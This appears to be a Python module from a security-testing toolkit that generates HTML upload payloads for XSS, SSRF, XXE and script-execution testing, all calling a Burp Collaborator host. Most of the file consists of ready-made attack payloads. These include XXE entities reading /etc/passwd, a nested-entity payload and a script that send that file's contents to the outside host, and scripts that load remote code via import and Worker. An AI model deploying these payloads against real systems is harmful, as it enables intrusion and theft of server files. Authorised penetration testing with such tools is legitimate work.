from pathlib import Path

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_html_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('xxe'):
        xxe_dir = output_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    
    html_xss1_script = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<script>fetch('{base_url}/xss-html-script')</script>
</body>
</html>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss1_script.html", 'w', encoding='utf-8') as f:
            f.write(html_xss1_script)
    
    html_xss2_img = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<img src=x onerror=fetch('{base_url}/xss-html-img')>
</body>
</html>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss2_img.html", 'w', encoding='utf-8') as f:
            f.write(html_xss2_img)
    
    html_xss3_svg = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<svg onload=fetch('{base_url}/xss-html-svg')>
</body>
</html>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss3_svg.html", 'w', encoding='utf-8') as f:
            f.write(html_xss3_svg)
    
    html_ssrf1_img = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<img src='{base_url}/ssrf-html-img'>
</body>
</html>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf1_img.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf1_img)
    
    html_ssrf2_link = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
<link rel='stylesheet' href='{base_url}/ssrf-html-link'>
</head>
<body>
</body>
</html>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf2_link.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf2_link)
    
    html_ssrf3_script = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
<script src='{base_url}/ssrf-html-script'></script>
</head>
<body>
</body>
</html>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf3_script.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf3_script)
    
    html_ssrf4_iframe = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<iframe src='{base_url}/ssrf-html-iframe'></iframe>
</body>
</html>'''
    if should_generate_type('ssrf'):
        with open(ssrf_dir / "ssrf4_iframe.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf4_iframe)
        
        html_ssrf5_form = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<form action='{base_url}/ssrf-html-form' method='post'>
<input type='submit' value='Submit'>
</form>
</body>
</html>'''
        with open(ssrf_dir / "ssrf5_form.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf5_form)
        
        html_ssrf6_object = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<object data='{base_url}/ssrf-html-object'></object>
</body>
</html>'''
        with open(ssrf_dir / "ssrf6_object.html", 'w', encoding='utf-8') as f:
            f.write(html_ssrf6_object)
    
    if should_generate_type('xxe'):
        html_xxe1_doctype = f'''<!DOCTYPE html [
<!ENTITY xxe SYSTEM "{base_url}/xxe-html-1">
]>
<html>
<head>
<title>&xxe;</title>
</head>
<body>
Test
</body>
</html>'''
        with open(xxe_dir / "xxe1_doctype.html", 'w', encoding='utf-8') as f:
            f.write(html_xxe1_doctype)
        
        html_xxe2_file = f'''<!DOCTYPE html [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<html>
<head>
<title>&xxe;</title>
</head>
<body>
Test
</body>
</html>'''
        with open(xxe_dir / "xxe2_file.html", 'w', encoding='utf-8') as f:
            f.write(html_xxe2_file)
        
        html_xxe3_parameter = f'''<!DOCTYPE html [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-html-3">
%xxe;
]>
<html>
<head>
<title>Test</title>
</head>
<body>
Test
</body>
</html>'''
        with open(xxe_dir / "xxe3_parameter.html", 'w', encoding='utf-8') as f:
            f.write(html_xxe3_parameter)
        
        html_xxe4_nested = f'''<!DOCTYPE html [
<!ENTITY % remote SYSTEM "{base_url}/xxe-html-4">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-html-exfil?data=%file;'>">
%remote;
%eval;
%exfil;
]>
<html>
<head>
<title>Test</title>
</head>
<body>
Test
</body>
</html>'''
        with open(xxe_dir / "xxe4_nested.html", 'w', encoding='utf-8') as f:
            f.write(html_xxe4_nested)
        
        html_xxe5_svg_embed = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<svg xmlns="http://www.w3.org/2000/svg">
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{base_url}/xxe-html-svg">
]>
<text>&xxe;</text>
</svg>
</body>
</html>'''
        with open(xxe_dir / "xxe5_svg_embed.html", 'w', encoding='utf-8') as f:
            f.write(html_xxe5_svg_embed)
    
    html_rce1_eval = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<script>eval('fetch(\\'{base_url}/rce-html-eval\\')')</script>
</body>
</html>'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce1_eval.html", 'w', encoding='utf-8') as f:
            f.write(html_rce1_eval)
    
    html_rce2_function = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<script>Function('fetch(\\'{base_url}/rce-html-function\\')')()</script>
</body>
</html>'''
    if should_generate_type('rce'):
        with open(rce_dir / "rce2_function.html", 'w', encoding='utf-8') as f:
            f.write(html_rce2_function)
        
        html_rce3_import = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<script type="module">import('{base_url}/rce-html-import1')</script>
</body>
</html>'''
        with open(rce_dir / "rce3_import.html", 'w', encoding='utf-8') as f:
            f.write(html_rce3_import)
        
        html_rce4_worker = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<script>var w=new Worker('{base_url}/rce-html-worker1');w.onmessage=()=>fetch('{base_url}/rce-html-worker1?executed=true')</script>
</body>
</html>'''
        with open(rce_dir / "rce4_worker.html", 'w', encoding='utf-8') as f:
            f.write(html_rce4_worker)
        
        html_rce5_file_eval = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
<script>fetch('file:///etc/passwd').then(r=>r.text()).then(d=>eval('fetch(\\'{base_url}/rce-html-file1?data=\\'+encodeURIComponent(d))'))</script>
</body>
</html>'''
        with open(rce_dir / "rce5_file_eval.html", 'w', encoding='utf-8') as f:
            f.write(html_rce5_file_eval)
    
    master_html = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
<script src='{base_url}/ssrf-html-script'></script>
</head>
<body>
<script>fetch('{base_url}/xss-html-script')</script>
<img src='{base_url}/ssrf-html-img'>
<iframe src='{base_url}/ssrf-html-iframe'></iframe>
<script>eval('fetch(\\'{base_url}/rce-html-eval\\')')</script>
</body>
</html>'''
    with open(output_dir / "master.html", 'w', encoding='utf-8') as f:
        f.write(master_html)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'html', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'html', burp_collab, tech_filter)
